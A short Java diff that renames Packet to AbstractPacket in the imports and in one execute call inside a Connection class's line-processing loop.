@@ -21,7 +21,7 @@ import com.redpois0n.common.codec.Hex;
 import com.redpois0n.common.crypto.Crypto;
 import com.redpois0n.common.os.OperatingSystem;
 import com.redpois0n.packets.Header;
-import com.redpois0n.packets.Packet;
+import com.redpois0n.packets.AbstractPacket;
 import com.redpois0n.packets.PacketBuilder;
 import com.sun.management.OperatingSystemMXBean;
 
@@ -86,7 +86,7 @@ public class Connection implements Runnable {
 					continue;
 				}
 
-				Packet.execute(line);
+				AbstractPacket.execute(line);
 			}
 		} catch (Exception ex) {
 			ex.printStackTrace();
